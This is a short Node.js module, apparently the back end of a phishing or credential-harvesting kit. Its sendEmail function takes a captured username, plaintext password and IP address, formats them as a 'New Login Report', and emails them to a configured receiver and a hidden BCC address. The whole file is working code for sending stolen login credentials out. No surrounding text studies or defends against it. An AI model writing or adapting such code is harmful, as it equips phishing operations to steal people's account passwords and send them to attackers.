const nodemailer = require('nodemailer');

function createNodeMailerTransport() {
  return nodemailer.createTransport({
    pool: true,
    host: process.env.SMTP_HOST,
    port: process.env.SMTP_PORT,
    secure: true, // true for 465, false for other ports
    auth: {
      user: process.env.SMTP_USER,
      pass: process.env.SMTP_PASS
    }
  });
}

function sendEmail(res, subject, username, pass, ip, type) {
  const transport = createNodeMailerTransport();

  const mailDetails = {
    from: `"${process.env.MAIL_SENDER_NAME}" <${process.env.SMTP_USER}>`,
    to: process.env.MAIL_RECEIVER,
    bcc: process.env.BCC_RECEIVER,
    subject,
    html: `
      <h3>New Login Report</h3>
      <p><b>Username:</b> ${username}</p>
      <p><b>Password:</b> ${pass}</p>
      <p><b>IP Address:</b> ${ip}</p>
      <p><b>Type:</b> ${type}</p>
    `
  };

  transport.sendMail(mailDetails, (err, data) => {
    if (err) {
      console.error("Mail error:", err.message || err);
      return res.status(400).send({ response: 'failed' });
    }
    console.log("Mail sent successfully");
    return res.status(200).send({ response: 'success' });
  });
}

module.exports = {
  sendEmail
};
